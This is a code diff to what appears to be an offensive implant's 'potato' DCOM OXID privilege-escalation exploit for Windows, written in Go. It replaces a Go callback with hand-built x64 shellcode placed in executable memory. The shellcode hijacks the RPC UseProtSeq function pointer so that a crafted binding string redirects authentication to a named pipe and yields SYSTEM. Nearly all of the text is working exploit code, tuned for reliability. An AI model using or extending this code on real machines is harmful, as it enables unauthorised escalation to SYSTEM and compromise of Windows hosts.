@@ -74,6 +74,15 @@ type potatoState struct {
 	// Pre-computed DUALSTRINGARRAY bytes (built before hook install to avoid
 	// fmt.Sprintf/allocations inside the RPC dispatch callback context)
 	precomputedDSA []byte
+	// iunknownRef prevents Go's GC from collecting the IUnknown COM object.
+	// Without this, the object returned as uintptr could be GC'd while COM
+	// still references it, causing an access violation crash.
+	iunknownRef interface{}
+	// shellcodePage is the VirtualAlloc'd page for the native hook shellcode.
+	// Stored here so we can VirtualFree it during cleanup.
+	shellcodePage uintptr
+	// dsaHeapBuf is the HeapAlloc'd DSA buffer address embedded in shellcode.
+	dsaHeapBuf uintptr
 }
 
 var potatoGlobal potatoState
@@ -174,87 +183,83 @@ func buildPipeDSA(pipeUniqueName string) []byte {
 	return buf[:4+entriesCount*2]
 }
 
-// handleUseProtSeq is the core hook handler called from the RPC dispatch context.
-// It does ONLY minimal work: HeapAlloc, memcpy from pre-computed buffer, pointer write.
-// No Go allocations, no fmt, no mutex — safe for RPC callback context.
-func handleUseProtSeq(ppdsaNewBindings uintptr) uintptr {
-	if ppdsaNewBindings == 0 {
-		return 0
+// buildNativeHook creates a native x64 shellcode hook for the UseProtSeq dispatch.
+// Using raw shellcode instead of syscall.NewCallback avoids crashes caused by Go's
+// callback trampoline interacting with the NDR interpreter's RPC dispatch thread.
+// The shellcode simply reads ppdsaNewBindings from the correct parameter position,
+// writes the pre-allocated DSA buffer address, and returns 0.
+func buildNativeHook(paramCount int, dsaBufAddr uintptr) (hookAddr uintptr, err error) {
+	ppdsaIndex := paramCount - 2
+	code := make([]byte, 0, 64)
+
+	// Step 1: Load ppdsaNewBindings into RAX from the correct parameter position.
+	// x64 Windows calling convention: RCX=p0, RDX=p1, R8=p2, R9=p3, stack=p4+
+	switch ppdsaIndex {
+	case 0:
+		code = append(code, 0x48, 0x89, 0xC8) // mov rax, rcx
+	case 1:
+		code = append(code, 0x48, 0x89, 0xD0) // mov rax, rdx
+	case 2:
+		code = append(code, 0x4C, 0x89, 0xC0) // mov rax, r8
+	case 3:
+		code = append(code, 0x4C, 0x89, 0xC8) // mov rax, r9
+	default:
+		// Stack parameter: [RSP + 8*(ppdsaIndex+1)]
+		offset := byte(8 * (ppdsaIndex + 1))
+		code = append(code, 0x48, 0x8B, 0x44, 0x24, offset) // mov rax, [rsp+offset]
 	}
 
-	src := potatoGlobal.precomputedDSA
-	srcLen := len(src)
-	if srcLen == 0 {
-		return 0
+	// Step 2: test rax, rax — check for null pointer
+	code = append(code, 0x48, 0x85, 0xC0)
+
+	// Step 3: jz done — skip write if null (jump 13 bytes over mov+mov)
+	code = append(code, 0x74, 0x0D)
+
+	// Step 4: mov rcx, <dsaBufAddr> — load pre-allocated DSA address
+	addrBytes := make([]byte, 8)
+	binary.LittleEndian.PutUint64(addrBytes, uint64(dsaBufAddr))
+	code = append(code, 0x48, 0xB9) // mov rcx, imm64
+	code = append(code, addrBytes...)
+
+	// Step 5: mov [rax], rcx — write DSA address to *ppdsaNewBindings
+	code = append(code, 0x48, 0x89, 0x08)
+
+	// done:
+	// Step 6: xor eax, eax — return 0 (RPC_S_OK)
+	code = append(code, 0x33, 0xC0)
+
+	// Step 7: ret
+	code = append(code, 0xC3)
+
+	// Allocate executable memory and copy shellcode
+	page, allocErr := windows.VirtualAlloc(0, 4096,
+		windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_EXECUTE_READWRITE)
+	if allocErr != nil {
+		return 0, fmt.Errorf("VirtualAlloc for hook shellcode: %v", allocErr)
 	}
 
-	// Allocate from process heap (HEAP_ZERO_MEMORY = 0x08)
-	hHeap, _, _ := procGetProcessHeap.Call()
-	if hHeap == 0 {
-		return 0
-	}
-	buf, _, _ := procHeapAlloc.Call(hHeap, 0x08, uintptr(srcLen))
-	if buf == 0 {
-		return 0
-	}
+	dst := unsafe.Slice((*byte)(unsafe.Pointer(page)), len(code))
+	copy(dst, code)
 
-	// Copy pre-computed DUALSTRINGARRAY
-	dst := unsafe.Slice((*byte)(unsafe.Pointer(buf)), srcLen)
-	copy(dst, src)
-
-	// Write pointer to *ppdsaNewBindings (DUALSTRINGARRAY**)
-	*(*uintptr)(unsafe.Pointer(ppdsaNewBindings)) = buf
-
-	// Set flag without mutex (atomic store is safe enough for a bool diagnostic)
-	potatoGlobal.hookCalled = true
-
-	return 0 // RPC_S_OK
+	potatoGlobal.shellcodePage = page
+	return page, nil
 }
 
-// createHookCallback creates a syscall.NewCallback with the correct number of
-// parameters for this Windows version. The ppdsaNewBindings output is always
-// the second-to-last parameter, regardless of the total count.
-func createHookCallback(paramCount int) (uintptr, error) {
-	switch paramCount {
-	case 4:
-		return syscall.NewCallback(func(a0, a1, a2, a3 uintptr) uintptr {
-			return handleUseProtSeq(a2) // second-to-last
-		}), nil
-	case 5:
-		return syscall.NewCallback(func(a0, a1, a2, a3, a4 uintptr) uintptr {
-			return handleUseProtSeq(a3)
-		}), nil
-	case 6:
-		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5 uintptr) uintptr {
-			return handleUseProtSeq(a4)
-		}), nil
-	case 7:
-		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6 uintptr) uintptr {
-			return handleUseProtSeq(a5)
-		}), nil
-	case 8:
-		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7 uintptr) uintptr {
-			return handleUseProtSeq(a6)
-		}), nil
-	case 9:
-		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7, a8 uintptr) uintptr {
-			return handleUseProtSeq(a7)
-		}), nil
-	case 10:
-		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) uintptr {
-			return handleUseProtSeq(a8)
-		}), nil
-	case 11:
-		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10 uintptr) uintptr {
-			return handleUseProtSeq(a9)
-		}), nil
-	case 12:
-		return syscall.NewCallback(func(a0, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11 uintptr) uintptr {
-			return handleUseProtSeq(a10)
-		}), nil
-	default:
-		return 0, fmt.Errorf("unsupported UseProtSeq parameter count: %d (expected 4-12)", paramCount)
+// allocateDSAOnHeap allocates the DUALSTRINGARRAY on the process heap using HeapAlloc.
+// The RPC runtime expects heap-allocated memory (it calls MIDL_user_free = HeapFree).
+func allocateDSAOnHeap(dsaData []byte) (uintptr, error) {
+	hHeap, _, _ := procGetProcessHeap.Call()
+	if hHeap == 0 {
+		return 0, fmt.Errorf("GetProcessHeap returned null")
 	}
+	buf, _, callErr := procHeapAlloc.Call(hHeap, 0x08, uintptr(len(dsaData)))
+	if buf == 0 {
+		return 0, fmt.Errorf("HeapAlloc(%d bytes): %v", len(dsaData), callErr)
+	}
+	dst := unsafe.Slice((*byte)(unsafe.Pointer(buf)), len(dsaData))
+	copy(dst, dsaData)
+	potatoGlobal.dsaHeapBuf = buf
+	return buf, nil
 }
 
 // getSystemViaPotato wraps the DCOM OXID exploit with a watchdog timer.
@@ -444,12 +449,25 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	overlapped.HEvent = event
 	procConnectNamedPipe.Call(hPipe, uintptr(unsafe.Pointer(&overlapped)))
 
-	// Phase 5: Create hook callback with correct parameter count and install
+	// Phase 5: Build native shellcode hook and install it.
+	// We use raw x64 shellcode instead of syscall.NewCallback because Go's callback
+	// trampoline crashes when called from the NDR interpreter's RPC dispatch thread.
 	atomic.StoreInt32(phase, 5)
-	hookCallback, hookErr := createHookCallback(paramCount)
+
+	// Allocate DSA on the process heap (RPC runtime will HeapFree it)
+	dsaBufAddr, dsaErr := allocateDSAOnHeap(potatoGlobal.precomputedDSA)
+	if dsaErr != nil {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Failed to allocate DSA on heap: %v", dsaErr),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	hookAddr, hookErr := buildNativeHook(paramCount, dsaBufAddr)
 	if hookErr != nil {
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Failed to create hook callback: %v", hookErr),
+			Output:    fmt.Sprintf("Failed to build hook shellcode: %v", hookErr),
 			Status:    "error",
 			Completed: true,
 		}
@@ -467,12 +485,16 @@ func doPotatoExploit(oldIdentity string, phase *int32) structs.CommandResult {
 	}
 
 	// Replace the function pointer
-	*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = hookCallback
+	*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = hookAddr
 
 	// Restore protection and original function pointer on exit
 	defer func() {
 		*(*uintptr)(unsafe.Pointer(useProtSeqSlot)) = origFunc
 		windows.VirtualProtect(useProtSeqSlot, unsafe.Sizeof(uintptr(0)), oldProtect, &oldProtect)
+		if potatoGlobal.shellcodePage != 0 {
+			windows.VirtualFree(potatoGlobal.shellcodePage, 0, windows.MEM_RELEASE)
+			potatoGlobal.shellcodePage = 0
+		}
 	}()
 
 	// Phase 6: Trigger OXID resolution via crafted OBJREF.
@@ -810,6 +832,12 @@ func createMinimalIUnknown() uintptr {
 
 	// The COM object is just a pointer to its vtable pointer
 	obj := &struct{ vtbl *iunknownVtbl }{vtbl: vtbl}
+
+	// Store reference in potatoGlobal to prevent GC from collecting the object.
+	// Without this, converting to uintptr removes the only Go reference, and
+	// the GC could free the object while COM still holds a native pointer to it.
+	potatoGlobal.iunknownRef = obj
+
 	return uintptr(unsafe.Pointer(obj))
 }
 
